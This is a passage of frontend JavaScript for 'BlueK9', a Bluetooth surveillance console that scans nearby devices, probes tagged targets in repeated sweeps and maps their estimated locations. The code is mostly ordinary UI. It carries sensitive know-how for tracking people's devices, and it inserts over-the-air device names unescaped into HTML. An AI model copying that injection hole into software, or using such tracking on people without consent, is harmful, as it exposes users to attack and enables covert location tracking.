/**
 * BlueK9 Client - Frontend JavaScript
 * Tactical Bluetooth Surveillance System
 */

// Global state
let map = null;
let socket = null;
let devices = {};
let targets = {};
let markers = {};
let cepCircles = {};
let systemMarker = null;
let followGps = false;  // Disabled by default
let initialMapCentered = false;  // Track if we've centered on first GPS fix
let showCep = true;
let showBreadcrumbs = false;
let scanning = false;
let deviceTypeChart = null;
let currentMapStyle = 'dark';
let breadcrumbMarkers = [];
let currentTimezone = 'UTC';
let contextMenuTarget = null;
const commLines = {};
const nameRetrievalActive = {};

// Active operations tracking
const activeOperations = new Map(); // id -> { type, label, bdAddress?, startTime, cancellable }

// Operations management functions
function addOperation(id, type, label, options = {}) {
    activeOperations.set(id, {
        type,
        label,
        bdAddress: options.bdAddress || null,
        startTime: Date.now(),
        cancellable: options.cancellable !== false,
        cancelFn: options.cancelFn || null
    });
    updateOperationsBar();
}

function removeOperation(id) {
    activeOperations.delete(id);
    updateOperationsBar();
}

function updateOperationsBar() {
    const opsList = document.getElementById('opsList');
    if (!opsList) return;

    if (activeOperations.size === 0) {
        opsList.innerHTML = '<span class="ops-none">None</span>';
        return;
    }

    opsList.innerHTML = '';
    activeOperations.forEach((op, id) => {
        const item = document.createElement('div');
        item.className = 'ops-item';
        item.dataset.opId = id;

        const elapsed = Math.floor((Date.now() - op.startTime) / 1000);
        const timeStr = elapsed < 60 ? `${elapsed}s` : `${Math.floor(elapsed/60)}m${elapsed%60}s`;

        let labelHtml = `<span class="ops-type">${op.type}:</span> ${op.label}`;
        if (op.bdAddress) {
            labelHtml += ` <span class="ops-bd">${op.bdAddress.substring(0,8)}...</span>`;
        }
        labelHtml += ` <span class="ops-time">(${timeStr})</span>`;

        item.innerHTML = labelHtml;

        if (op.cancellable && op.cancelFn) {
            const cancelBtn = document.createElement('button');
            cancelBtn.className = 'ops-cancel';
            cancelBtn.innerHTML = '✕';
            cancelBtn.title = 'Cancel operation';
            cancelBtn.onclick = (e) => {
                e.stopPropagation();
                op.cancelFn();
            };
            item.appendChild(cancelBtn);
        }

        opsList.appendChild(item);
    });
}

// Update operation timers every second
setInterval(() => {
    if (activeOperations.size > 0) {
        updateOperationsBar();
    }
}, 1000);

// Map styles
const MAP_STYLES = {
    dark: 'mapbox://styles/mapbox/dark-v11',
    streets: 'mapbox://styles/mapbox/streets-v12',
    satellite: 'mapbox://styles/mapbox/satellite-streets-v12'
};

/**
 * Initialize the application
 */
function initApp() {
    // Initialize Mapbox
    mapboxgl.accessToken = MAPBOX_TOKEN;

    // Load saved map style from localStorage or default to dark
    const savedMapStyle = localStorage.getItem('bluek9_map_style') || 'dark';
    currentMapStyle = savedMapStyle;

    map = new mapboxgl.Map({
        container: 'map',
        style: MAP_STYLES[savedMapStyle],
        center: [-98.5795, 39.8283], // US center as default
        zoom: 4
    });

    // Update map style button states
    document.querySelectorAll('.btn-map').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.style === savedMapStyle);
    });

    map.addControl(new mapboxgl.NavigationControl());
    map.addControl(new mapboxgl.ScaleControl());

    // Initialize WebSocket
    initWebSocket();

    // Initialize chart
    initChart();

    // Load initial data
    loadTargets();
    loadSmsNumbers();
    loadRadios();
    loadLogs();
    loadGpsConfig();
    loadTimezone();  // Load timezone before starting time display

    // Check for session restart and clear geo data if needed
    checkSessionAndResetIfNeeded();

    // Update time display
    setInterval(updateTime, 1000);
    updateTime();

    // Start session timer
    startSessionTimer();

    // Fetch hardware stats every 5 seconds
    setInterval(fetchSystemStats, 5000);
    fetchSystemStats();

    // Load system ID for footer display
    loadSystemIdForFooter();

    // Map click handler
    map.on('click', (e) => {
        // Clicked on empty map area
        document.getElementById('selectedDevice').textContent = 'NONE';
    });
}

/**
 * Load system ID for the footer display on startup
 */
function loadSystemIdForFooter() {
    fetch('/api/settings')
        .then(r => r.json())
        .then(data => {
            const footerIdEl = document.getElementById('systemIdFooter');
            if (footerIdEl && data.system_id) {
                footerIdEl.textContent = data.system_id;
            }
        })
        .catch(e => console.log('Could not load system ID for footer'));
}

/**
 * Check if server session has changed and reset geo data if needed
 * This ensures heatmaps, trails, CEPs are cleared on system restart
 */
function checkSessionAndResetIfNeeded() {
    fetch('/api/version')
        .then(r => r.json())
        .then(data => {
            const storedSessionId = localStorage.getItem('bluek9_session_id');
            const currentSessionId = data.session_id;

            if (storedSessionId && storedSessionId !== currentSessionId) {
                // Session has changed - server was restarted
                console.log(`Session changed: ${storedSessionId} -> ${currentSessionId}, resetting geo data`);
                addLogEntry('System restart detected - clearing geodata', 'INFO');

                // Clear all geodata without prompts
                resetGeoDataSilently();
            }

            // Store current session ID
            if (currentSessionId) {
                localStorage.setItem('bluek9_session_id', currentSessionId);
            }
        })
        .catch(e => {
            console.log('Failed to check session ID:', e);
        });
}

/**
 * Silently reset all geodata (called on system restart detection)
 */
function resetGeoDataSilently() {
    // Clear local markers/trails
    clearBreadcrumbs();
    clearSystemTrail();

    // Clear all CEP circles
    Object.keys(cepCircles).forEach(bdAddr => {
        const sourceId = `cep-${bdAddr}`;
        if (map.getLayer(sourceId)) map.removeLayer(sourceId);
        if (map.getSource(sourceId)) map.removeSource(sourceId);
        delete cepCircles[bdAddr];
    });

    // Clear device markers
    Object.keys(markers).forEach(bdAddr => {
        if (markers[bdAddr]) markers[bdAddr].remove();
        delete markers[bdAddr];
    });

    // Reset server-side data
    fetch('/api/breadcrumbs/reset', { method: 'POST' }).catch(() => {});
    fetch('/api/geo/reset_all', { method: 'POST' }).catch(() => {});
    fetch('/api/system_trail/reset', { method: 'POST' }).catch(() => {});

    // Clear local device cache
    devices = {};
    updateSurveyTable();
    updateStats();
}

/**
 * Initialize WebSocket connection
 */
function initWebSocket() {
    socket = io();

    socket.on('connect', () => {
        addLogEntry('Connected to server', 'INFO');
        // Sync state on reconnect
        syncSystemState();
    });

    socket.on('disconnect', () => {
        addLogEntry('Disconnected from server', 'WARNING');
        // Don't reset UI state on disconnect - server operations may still be running
    });

    socket.on('device_update', (device) => {
        updateDevice(device);
    });

    socket.on('devices_list', (deviceList) => {
        // Batch process all devices at once to prevent UI lag on reconnect
        console.log(`Received devices_list with ${deviceList.length} devices`);

        // Directly set all devices in the cache first (fast)
        deviceList.forEach(device => {
            devices[device.bd_address] = device;
        });

        // Update UI once after all devices are loaded
        updateSurveyTable();
        updateStats();

        // Create/update markers in batches with delay to prevent blocking
        const batchSize = 50;
        let index = 0;

        function processBatch() {
            const batch = deviceList.slice(index, index + batchSize);
            batch.forEach(device => {
                // Only create marker if device has location
                if (device.emitter_lat && device.emitter_lon) {
                    updateDeviceMarker(device);
                }
            });
            index += batchSize;
            if (index < deviceList.length) {
                // Process next batch after a short delay
                setTimeout(processBatch, 10);
            }
        }

        // Start batch processing of markers
        if (deviceList.length > 0) {
            processBatch();
        }

        addLogEntry(`Loaded ${deviceList.length} devices from server`, 'INFO');
    });

    socket.on('devices_cleared', () => {
        clearAllDevices();
    });

    socket.on('gps_update', (location) => {
        updateSystemLocation(location);
    });

    socket.on('log_update', (entry) => {
        addLogEntry(entry.message, entry.level);
    });

    socket.on('target_alert', (data) => {
        showTargetAlert(data);
    });

    socket.on('target_survey_started', (data) => {
        addLogEntry(`Target survey started: probing ${data.target_count} target(s)`, 'INFO');
    });

    socket.on('target_survey_progress', (data) => {
        const name = data.alias ? `${data.alias} (${data.bd_address})` : data.bd_address;
        addLogEntry(`Probing target ${data.current}/${data.total}: ${name}`, 'DEBUG');
    });

    socket.on('target_survey_result', (data) => {
        const name = data.alias ? `${data.alias} (${data.bd_address})` : data.bd_address;
        if (data.present) {
            const methods = data.methods_responded.join(', ');
            addLogEntry(`TARGET DETECTED: ${name} via ${methods}`, 'WARNING');
        }
    });

    socket.on('target_survey_complete', (data) => {
        addLogEntry(`Target survey complete: ${data.found}/${data.total} targets detected`, 'INFO');
    });

    // Continuous survey events
    socket.on('target_survey_sweep_start', (data) => {
        if (data.continuous) {
            addLogEntry(`Starting sweep #${data.sweep_number}...`, 'DEBUG');
        }
    });

    socket.on('target_survey_sweep_complete', (data) => {
        if (data.continuous) {
            const status = data.found > 0 ? 'WARNING' : 'INFO';
            addLogEntry(`Sweep #${data.sweep_number} complete: ${data.found}/${data.total} targets detected (${data.duration}s)`, status);
            if (data.next_sweep_in) {
                addLogEntry(`Next sweep in ${data.next_sweep_in}s...`, 'DEBUG');
            }
        }
    });

    socket.on('target_survey_countdown', (data) => {
        // Optional: Could update a countdown display, for now just log at key points
        if (data.seconds_remaining === 10) {
            addLogEntry(`Sweep #${data.sweep_number} starting in ${data.seconds_remaining}s...`, 'DEBUG');
        }
    });

    socket.on('device_info', (info) => {
        showDeviceInfo(info);
    });

    socket.on('name_result', (data) => {
        handleNameResult(data);
    });

    socket.on('geo_ping', (data) => {
        handleGeoPing(data);
    });

    socket.on('ubertooth_update', (data) => {
        // Update piconet count
        const piconetCount = document.getElementById('ubertoothPiconetCount');
        if (piconetCount && data.packet_count) {
            // We'll refresh the full data periodically
            refreshUbertoothData();
        }
    });

    // Handle system restart/update - redirect to login
    socket.on('system_restart', () => {
        addLogEntry('System restart detected - redirecting to login', 'WARNING');

        // Check if restart overlay is already showing (user initiated restart)
        const existingOverlay = document.getElementById('restartOverlay');
        if (existingOverlay && !existingOverlay.classList.contains('hidden')) {
            // Restart overlay already visible, just redirect after delay
            setTimeout(() => {
                window.location.href = '/login';
            }, 2000);
            return;
        }

        // Show notification and redirect after short delay
        const notification = document.createElement('div');
        notification.className = 'system-restart-overlay';
        notification.innerHTML = `
            <div class="restart-message">
                <div class="restart-icon">&#8635;</div>
                <div class="restart-title">SYSTEM RESTARTING</div>
                <div class="restart-subtitle">Redirecting to login...</div>
            </div>
        `;
        document.body.appendChild(notification);

        // Redirect to login after 2 seconds
        setTimeout(() => {
            window.location.href = '/login';
        }, 2000);
    });

    // Handle server-side data clear - reset relevant UI
    socket.on('data_cleared', (data) => {
        addLogEntry(`Server data cleared: ${data.type || 'all'}`, 'INFO');
        if (data.type === 'devices' || data.type === 'all') {
            clearAllDevices();
        }
        if (data.type === 'geo' || data.type === 'all') {
            resetCepCircles();
            Object.keys(markers).forEach(bdAddr => {
                if (markers[bdAddr]) markers[bdAddr].remove();
                delete markers[bdAddr];
            });
        }
        if (data.type === 'trail' || data.type === 'all') {
            clearSystemTrail();
            liveTrailCoordinates = [];
        }
        if (data.type === 'heatmap' || data.type === 'all') {
            clearBreadcrumbs();
        }
    });
}

/**
 * Reset UI state (called on system restart/update)
 */
function resetUIState() {
    // Clear all device data
    devices = {};
    markers = {};
    cepCircles = {};

    // Clear visual elements
    clearBreadcrumbs();
    clearSystemTrail();
    liveTrailCoordinates = [];

    // Reset operations bar
    activeOperations.clear();
    updateOperationsBar();

    // Reset scan status
    updateScanStatus(false);

    // Reset tracking UI
    manualTrackingBd = null;
    activeGeoSessions.clear();
    const btnStart = document.getElementById('btnStartTrack');
    const btnStop = document.getElementById('btnStopTrack');
    const trackSelect = document.getElementById('trackTargetSelect');
    const trackingStatus = document.getElementById('trackingStatus');
    if (btnStart) btnStart.disabled = false;
    if (btnStop) btnStop.disabled = true;
    if (trackSelect) trackSelect.disabled = false;
    if (trackingStatus) {
        trackingStatus.textContent = '--';
        trackingStatus.className = 'tracking-status';
    }

    // Update UI tables
    updateSurveyTable();
    updateStats();

    // Re-sync with server
    syncSystemState();
}

/**
 * Sync system state on connect/reconnect
 */
function syncSystemState() {
    fetch('/api/state')
        .then(r => r.json())
        .then(state => {
            // Clear existing operations on reconnect
            activeOperations.clear();

            // Sync scanning state
            updateScanStatus(state.scanning);

            // Sync active geo sessions
            activeGeoSessions.clear();
            state.active_geo_sessions.forEach(session => {
                activeGeoSessions.add(session.bd_address);
                updateGeoButtonState(session.bd_address, true);

                // Add to operations bar
                addOperation(`geo-${session.bd_address}`, 'GEO', 'Tracking', {
                    bdAddress: session.bd_address,
                    cancellable: true,
                    cancelFn: () => stopActiveGeo(session.bd_address)
                });

                // If this is the manual tracking target, update panel
                const select = document.getElementById('trackTargetSelect');
                if (select && select.value === session.bd_address) {
                    manualTrackingBd = session.bd_address;
                    document.getElementById('btnStartTrack').disabled = true;
                    document.getElementById('btnStopTrack').disabled = false;
                    document.getElementById('trackTargetSelect').disabled = true;
                    document.getElementById('trackingStatus').textContent = 'ACTIVE';
                    document.getElementById('trackingStatus').className = 'tracking-status active';
                }
            });

            // Check if any tracking session matches our dropdown
            if (state.active_geo_sessions.length > 0) {
                const select = document.getElementById('trackTargetSelect');
                const activeSession = state.active_geo_sessions.find(s => s.bd_address === select?.value);
                if (!activeSession && manualTrackingBd) {
                    // Our tracked target stopped, reset UI
                    if (!state.active_geo_sessions.find(s => s.bd_address === manualTrackingBd)) {
                        manualTrackingBd = null;
                        document.getElementById('btnStartTrack').disabled = false;
                        document.getElementById('btnStopTrack').disabled = true;
                        document.getElementById('trackTargetSelect').disabled = false;
                        document.getElementById('trackingStatus').textContent = '--';
                        document.getElementById('trackingStatus').className = 'tracking-status';
                    }
                }
            }

            addLogEntry(`State synced: scanning=${state.scanning}, geo_sessions=${state.active_geo_sessions.length}`, 'INFO');
        })
        .catch(e => {
            // May fail if not logged in yet
            console.log('State sync failed:', e);
        });
}

function handleNameResult(data) {
    const bdAddress = data.bd_address;
    const attempt = data.attempt;

    if (data.status === 'found' && data.name) {
        addLogEntry(`[Attempt ${attempt}] Got name for ${bdAddress}: ${data.name}`, 'INFO');
        if (devices[bdAddress]) {
            devices[bdAddress].device_name = data.name;
            updateSurveyTable();
        }
    } else if (data.status === 'no_response') {
        addLogEntry(`[Attempt ${attempt}] No name response from ${bdAddress}`, 'DEBUG');
    } else if (data.status === 'timeout') {
        addLogEntry(`[Attempt ${attempt}] Name query timeout for ${bdAddress}`, 'DEBUG');
    } else if (data.status === 'error') {
        addLogEntry(`[Attempt ${attempt}] Name query error for ${bdAddress}: ${data.error}`, 'WARNING');
    }
}

/**
 * Initialize modern statistics visualization
 */
// RSSI history for real-time display
let activityHistory = [];
const MAX_ACTIVITY_POINTS = 40;
let signalPulseAnimation = null;
let activityChart = null;
let lastDeviceCount = 0;
let lastUpdateCount = 0;

function initChart() {
    const ctx = document.getElementById('deviceTypeChart').getContext('2d');

    // Create gradient for device count area
    const deviceGradient = ctx.createLinearGradient(0, 0, 0, 80);
    deviceGradient.addColorStop(0, 'rgba(0, 212, 255, 0.5)');
    deviceGradient.addColorStop(1, 'rgba(0, 212, 255, 0)');

    // Create gradient for target count
    const targetGradient = ctx.createLinearGradient(0, 0, 0, 80);
    targetGradient.addColorStop(0, 'rgba(255, 59, 48, 0.5)');
    targetGradient.addColorStop(1, 'rgba(255, 59, 48, 0)');

    // Initialize with zero values
    for (let i = 0; i < MAX_ACTIVITY_POINTS; i++) {
        activityHistory.push({ deviceCount: 0, targetCount: 0, activeCount: 0 });
    }

    activityChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: Array(MAX_ACTIVITY_POINTS).fill(''),
            datasets: [
                {
                    label: 'Total Devices',
                    data: activityHistory.map(d => d.deviceCount),
                    borderColor: 'rgba(0, 212, 255, 1)',
                    backgroundColor: deviceGradient,
                    fill: true,
                    tension: 0.3,
                    borderWidth: 2,
                    pointRadius: 0
                },
                {
                    label: 'Active (30s)',
                    data: activityHistory.map(d => d.activeCount),
                    borderColor: 'rgba(48, 209, 88, 1)',
                    backgroundColor: 'transparent',
                    fill: false,
                    tension: 0.3,
                    borderWidth: 2,
                    pointRadius: 0
                },
                {
                    label: 'Targets',
                    data: activityHistory.map(d => d.targetCount),
                    borderColor: 'rgba(255, 59, 48, 1)',
                    backgroundColor: targetGradient,
                    fill: true,
                    tension: 0.3,
                    borderWidth: 2,
                    pointRadius: 0
                }
            ]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            animation: {
                duration: 300
            },
            interaction: {
                mode: 'index',
                intersect: false
            },
            scales: {
                x: { display: false },
                y: {
                    display: true,
                    position: 'right',
                    beginAtZero: true,
                    grid: {
                        color: 'rgba(0, 212, 255, 0.1)',
                        drawBorder: false
                    },
                    ticks: {
                        color: '#484f58',
                        font: { family: 'Share Tech Mono', size: 8 },
                        maxTicksLimit: 4,
                        stepSize: 1
                    }
                }
            },
            plugins: {
                legend: { display: false },
                tooltip: {
                    enabled: true,
                    backgroundColor: 'rgba(10, 14, 20, 0.9)',
                    borderColor: 'rgba(0, 212, 255, 0.5)',
                    borderWidth: 1
                }
            }
        }
    });

    // Initialize signal pulse canvas
    initSignalPulse();

    // Update activity chart every second
    setInterval(updateActivityChart, 1000);

    // Load version info
    loadVersionInfo();
}

/**
 * Initialize the signal pulse visualization
 */
function initSignalPulse() {
    const container = document.getElementById('signalPulseContainer');
    if (!container) return;

    // Create canvas for pulse animation
    const canvas = document.createElement('canvas');
    canvas.id = 'signalPulseCanvas';
    canvas.width = 60;
    canvas.height = 60;
    container.appendChild(canvas);

    const ctx = canvas.getContext('2d');
    let pulseRadius = 0;

    function drawPulse() {
        ctx.clearRect(0, 0, 60, 60);

        const centerX = 30;
        const centerY = 30;
        const maxRadius = 25;

        // Get current best RSSI for color intensity
        let bestRssi = -100;
        Object.values(devices).forEach(d => {
            if (d.rssi && d.rssi !== '--') {
                const rssi = parseInt(d.rssi);
                if (rssi > bestRssi) bestRssi = rssi;
            }
        });

        // Calculate intensity based on RSSI (-30 = strongest, -100 = weakest)
        const intensity = Math.max(0, Math.min(1, (bestRssi + 100) / 70));

        // Draw outer ring
        ctx.beginPath();
        ctx.arc(centerX, centerY, maxRadius, 0, Math.PI * 2);
        ctx.strokeStyle = `rgba(0, 212, 255, ${0.2 + intensity * 0.3})`;
        ctx.lineWidth = 1;
        ctx.stroke();

        // Draw pulse rings (multiple for wave effect)
        for (let i = 0; i < 3; i++) {
            const offsetRadius = (pulseRadius + (i * 10)) % 30;
            const offsetOpacity = Math.max(0, 1 - (offsetRadius / 30));

            if (offsetOpacity > 0 && scanning) {
                ctx.beginPath();
                ctx.arc(centerX, centerY, offsetRadius, 0, Math.PI * 2);
                ctx.strokeStyle = `rgba(0, 212, 255, ${offsetOpacity * 0.5})`;
                ctx.lineWidth = 2;
                ctx.stroke();
            }
        }

        // Draw center dot with glow - brightness based on signal strength
        const isActive = scanning || Object.keys(devices).length > 0;
        const glowColor = intensity > 0.5 ? 'rgba(48, 209, 88, ' : 'rgba(0, 212, 255, ';

        const glowGradient = ctx.createRadialGradient(centerX, centerY, 0, centerX, centerY, 8);
        glowGradient.addColorStop(0, isActive ? glowColor + '1)' : 'rgba(100, 100, 100, 0.5)');
        glowGradient.addColorStop(0.5, isActive ? glowColor + (0.3 + intensity * 0.4) + ')' : 'rgba(100, 100, 100, 0.2)');
        glowGradient.addColorStop(1, 'rgba(0, 0, 0, 0)');

        ctx.beginPath();
        ctx.arc(centerX, centerY, 8, 0, Math.PI * 2);
        ctx.fillStyle = glowGradient;
        ctx.fill();

        // Center dot color based on signal strength
        let dotColor = '#666';
        if (scanning) {
            dotColor = intensity > 0.6 ? '#30d158' : '#00d4ff';
        }

        ctx.beginPath();
        ctx.arc(centerX, centerY, 4, 0, Math.PI * 2);
        ctx.fillStyle = dotColor;
        ctx.fill();

        // Animate pulse only when scanning
        if (scanning) {
            pulseRadius += 0.5;
            if (pulseRadius > 30) {
                pulseRadius = 0;
            }
        }

        signalPulseAnimation = requestAnimationFrame(drawPulse);
    }

    drawPulse();
}

/**
 * Update activity chart with device counts
 */
function updateActivityChart() {
    const now = new Date();
    const thirtySecondsAgo = new Date(now - 30000);

    // Count total devices
    const totalDevices = Object.keys(devices).length;

    // Count devices seen in last 30 seconds (active)
    let activeCount = 0;
    Object.values(devices).forEach(d => {
        if (d.last_seen) {
            const lastSeen = new Date(d.last_seen);
            if (lastSeen > thirtySecondsAgo) {
                activeCount++;
            }
        }
    });

    // Count targets currently detected
    const targetCount = Object.values(devices).filter(d => d.is_target).length;

    // Add new data point
    activityHistory.push({
        deviceCount: totalDevices,
        activeCount: activeCount,
        targetCount: targetCount
    });

    // Keep only last N points
    if (activityHistory.length > MAX_ACTIVITY_POINTS) {
        activityHistory.shift();
    }

    // Update chart
    if (activityChart) {
        activityChart.data.datasets[0].data = activityHistory.map(d => d.deviceCount);
        activityChart.data.datasets[1].data = activityHistory.map(d => d.activeCount);
        activityChart.data.datasets[2].data = activityHistory.map(d => d.targetCount);
        activityChart.update('none');
    }
}

/**
 * Load version info from server
 */
function loadVersionInfo() {
    fetch('/api/version')
        .then(r => r.json())
        .then(data => {
            const versionEl = document.querySelector('.version-text');
            if (versionEl && data.version) {
                versionEl.textContent = `BlueK9 ${data.version}`;
                if (data.commit) {
                    versionEl.title = `Commit: ${data.commit}`;
                }
            }
        })
        .catch(e => console.log('Could not load version info'));
}

/**
 * Update device in the UI
 */
function updateDevice(device) {
    const bdAddr = device.bd_address;
    devices[bdAddr] = device;

    // Update survey table
    updateSurveyTable();

    // Update map marker
    updateDeviceMarker(device);

    // Update statistics
    updateStats();

    // Update counters
    document.getElementById('deviceCount').textContent = Object.keys(devices).length;
    document.getElementById('surveyCount').textContent = Object.keys(devices).length;

    const targetCount = Object.values(devices).filter(d => d.is_target).length;
    document.getElementById('targetCount').textContent = targetCount;

    // Update tools tracking UI if this is the tracked device
    if (toolsTrackingActive && toolsTrackingBd === bdAddr) {
        updateToolsTrackingDisplay(device);
    }
}

// Survey table sorting state
let surveySort = { column: 'last_seen', direction: 'desc' };
let surveyFilter = '';

/**
 * Update the survey table
 */
function updateSurveyTable() {
    const tbody = document.getElementById('surveyTableBody');
    tbody.innerHTML = '';

    // Get filter value
    surveyFilter = (document.getElementById('surveySearch')?.value || '').toLowerCase();

    // Sort devices based on current sort state
    let sortedDevices = Object.values(devices).sort((a, b) => {
        // Targets always first
        if (a.is_target && !b.is_target) return -1;
        if (!a.is_target && b.is_target) return 1;

        // Then by selected column
        let aVal = a[surveySort.column];
        let bVal = b[surveySort.column];

        // Handle special cases
        if (surveySort.column === 'last_seen') {
            aVal = aVal ? new Date(aVal).getTime() : 0;
            bVal = bVal ? new Date(bVal).getTime() : 0;
        } else if (surveySort.column === 'rssi' || surveySort.column === 'emitter_accuracy' || surveySort.column === 'packet_count') {
            aVal = aVal || -999;
            bVal = bVal || -999;
        } else {
            aVal = (aVal || '').toString().toLowerCase();
            bVal = (bVal || '').toString().toLowerCase();
        }

        if (aVal < bVal) return surveySort.direction === 'asc' ? -1 : 1;
        if (aVal > bVal) return surveySort.direction === 'asc' ? 1 : -1;
        return 0;
    });

    sortedDevices.forEach(device => {
        const row = document.createElement('tr');
        row.dataset.bdAddress = device.bd_address;

        if (device.is_target) {
            row.classList.add('target-row');
        }

        // Check if row matches filter (includes bt_company from btmon)
        const searchFields = [
            device.bd_address,
            device.device_name,
            device.manufacturer,
            device.bt_company,
            device.device_type
        ].map(f => (f || '').toLowerCase()).join(' ');

        if (surveyFilter && !searchFields.includes(surveyFilter)) {
            row.classList.add('filtered-out');
        }

        const cep = device.emitter_accuracy
            ? `${device.emitter_accuracy.toFixed(0)}m`
            : '--';

        const lastSeen = formatTimeInTimezone(device.last_seen);

        // Device type badge
        const deviceType = device.device_type || 'unknown';
        const typeBadge = `<span class="device-type-badge ${deviceType}">${deviceType === 'ble' ? 'LE' : deviceType === 'classic' ? 'CL' : '?'}</span>`;

        const packetCount = device.packet_count || 0;

        row.innerHTML = `
            <td class="bd-address">${device.bd_address}</td>
            <td title="${device.device_name || 'Unknown'}">${truncate(device.device_name || 'Unknown', 10)}</td>
            <td>${typeBadge}</td>
            <td>${device.rssi || '--'}</td>
            <td class="packet-count">${packetCount}</td>
            <td class="cep-cell">${cep}</td>
            <td>${lastSeen}</td>
            <td>
                <button class="action-btn" onclick="getDeviceInfo('${device.bd_address}')" title="Get Info">i</button>
                <button class="action-btn geo-btn" onclick="toggleActiveGeo('${device.bd_address}')" title="Track Location" data-bd="${device.bd_address}">&#128205;</button>
                ${!device.is_target ? `<button class="action-btn" onclick="quickAddTarget('${device.bd_address}')" title="Add as Target">+</button>` : ''}
            </td>
        `;

        row.addEventListener('click', (e) => {
            if (e.target.tagName !== 'BUTTON') {
                selectDevice(device);
            }
        });

        // Right-click context menu
        row.addEventListener('contextmenu', (e) => {
            showContextMenu(e, device.bd_address);
        });

        tbody.appendChild(row);
    });

    // Update visible count
    const visibleCount = sortedDevices.filter(d => {
        const searchFields = [d.bd_address, d.device_name, d.manufacturer, d.bt_company, d.device_type]
            .map(f => (f || '').toLowerCase()).join(' ');
        return !surveyFilter || searchFields.includes(surveyFilter);
    }).length;
    document.getElementById('surveyCount').textContent = surveyFilter
        ? `${visibleCount}/${Object.keys(devices).length}`
        : Object.keys(devices).length;
}

/**
 * Sort survey table by column
 */
function sortSurveyTable(column) {
    // Toggle direction if same column
    if (surveySort.column === column) {
        surveySort.direction = surveySort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        surveySort.column = column;
        surveySort.direction = 'desc';
    }

    // Update header classes
    document.querySelectorAll('.survey-table th.sortable').forEach(th => {
        th.classList.remove('sort-asc', 'sort-desc');
        if (th.dataset.sort === column) {
            th.classList.add(surveySort.direction === 'asc' ? 'sort-asc' : 'sort-desc');
        }
    });

    updateSurveyTable();
}

/**
 * Filter survey table
 */
function filterSurveyTable() {
    updateSurveyTable();
}

/**
 * Clear survey filter
 */
function clearSurveyFilter() {
    document.getElementById('surveySearch').value = '';
    surveyFilter = '';
    updateSurveyTable();
}

/**
 * Update device marker on map
 */
function updateDeviceMarker(device) {
    const bdAddr = device.bd_address;

    // Remove existing marker
    if (markers[bdAddr]) {
        markers[bdAddr].remove();
    }

    // Remove existing CEP circle
    if (cepCircles[bdAddr] && map.getSource(`cep-${bdAddr}`)) {
        map.removeLayer(`cep-${bdAddr}`);
        map.removeSource(`cep-${bdAddr}`);
        delete cepCircles[bdAddr];
    }

    // Only add marker if we have valid location (not 0,0 which is null island)
    const lat = parseFloat(device.emitter_lat);
    const lon = parseFloat(device.emitter_lon);

    if (!lat || !lon || lat === 0 || lon === 0 || isNaN(lat) || isNaN(lon) ||
        lat < -90 || lat > 90 || lon < -180 || lon > 180) {
        return;
    }

    // Create marker element
    const el = document.createElement('div');
    el.className = device.is_target ? 'target-marker' : 'device-marker';

    // For target markers, add inner element for animation (prevents CSS transform conflict)
    if (device.is_target) {
        const inner = document.createElement('div');
        inner.className = 'target-marker-inner';
        el.appendChild(inner);
    }

    // Build popup with enhanced device info
    const typeLabel = device.device_type === 'ble' ? 'BLE' : device.device_type === 'classic' ? 'Classic' : 'Unknown';
    const mfr = device.bt_company || device.manufacturer || 'Unknown';
    const cepStr = device.emitter_accuracy ? `${device.emitter_accuracy.toFixed(1)}m` : 'N/A';

    // Create marker
    const marker = new mapboxgl.Marker(el)
        .setLngLat([lon, lat])
        .setPopup(new mapboxgl.Popup({ offset: 25 }).setHTML(`
            <strong>${device.bd_address}</strong><br>
            Name: ${device.device_name || 'Unknown'}<br>
            Type: ${typeLabel}<br>
            Manufacturer: ${mfr}<br>
            RSSI: ${device.rssi || '--'} dBm<br>
            CEP: ${cepStr}<br>
            Last Seen: ${formatTimeInTimezone(device.last_seen)}
        `))
        .addTo(map);

    markers[bdAddr] = marker;

    // Add CEP circle if enabled and we have accuracy
    if (showCep && device.emitter_accuracy) {
        addCepCircle(device);
    }

    // Update comm line if this device is being tracked
    if (commLines[bdAddr]) {
        showCommLine(bdAddr);
    }

    // Click handler
    el.addEventListener('click', () => selectDevice(device));
}

/**
 * Add CEP (Circular Error Probable) circle
 */
function addCepCircle(device) {
    const bdAddr = device.bd_address;
    const radius = device.emitter_accuracy || 50; // meters

    // Validate emitter location with robust parsing
    const lat = parseFloat(device.emitter_lat);
    const lon = parseFloat(device.emitter_lon);

    if (!lat || !lon || lat === 0 || lon === 0 || isNaN(lat) || isNaN(lon) ||
        lat < -90 || lat > 90 || lon < -180 || lon > 180) {
        return; // Don't add CEP if no valid location
    }

    // Create circle GeoJSON
    const circle = createGeoJSONCircle(
        [lon, lat],
        radius / 1000 // Convert to km
    );

    const sourceId = `cep-${bdAddr}`;
    const color = device.is_target ? '#ff3b30' : '#00d4ff';

    map.addSource(sourceId, {
        type: 'geojson',
        data: circle
    });

    map.addLayer({
        id: sourceId,
        type: 'fill',
        source: sourceId,
        paint: {
            'fill-color': color,
            'fill-opacity': 0.15,
            'fill-outline-color': color
        }
    });

    cepCircles[bdAddr] = true;
}

/**
 * Create a GeoJSON circle
 */
function createGeoJSONCircle(center, radiusKm, points = 64) {
    const coords = {
        latitude: center[1],
        longitude: center[0]
    };

    const km = radiusKm;
    const ret = [];
    const distanceX = km / (111.32 * Math.cos(coords.latitude * Math.PI / 180));
    const distanceY = km / 110.574;

    for (let i = 0; i < points; i++) {
        const theta = (i / points) * (2 * Math.PI);
        const x = distanceX * Math.cos(theta);
        const y = distanceY * Math.sin(theta);
        ret.push([coords.longitude + x, coords.latitude + y]);
    }
    ret.push(ret[0]);

    return {
        type: 'Feature',
        geometry: {
            type: 'Polygon',
            coordinates: [ret]
        }
    };
}

/**
 * Update system location marker
 */
function updateSystemLocation(location) {
    // Validate location (not null, not 0,0)
    if (!location.lat || !location.lon ||
        (location.lat === 0 && location.lon === 0) ||
        isNaN(location.lat) || isNaN(location.lon)) {
        return;
    }

    document.getElementById('sysLocation').textContent =
        `${location.lat.toFixed(5)}, ${location.lon.toFixed(5)}`;

    // Update or create system marker
    if (systemMarker) {
        systemMarker.setLngLat([location.lon, location.lat]);
    } else {
        const el = document.createElement('div');
        el.className = 'system-marker';

        systemMarker = new mapboxgl.Marker(el)
            .setLngLat([location.lon, location.lat])
            .setPopup(new mapboxgl.Popup({ offset: 25 }).setHTML('<strong>SYSTEM LOCATION</strong>'))
            .addTo(map);
    }

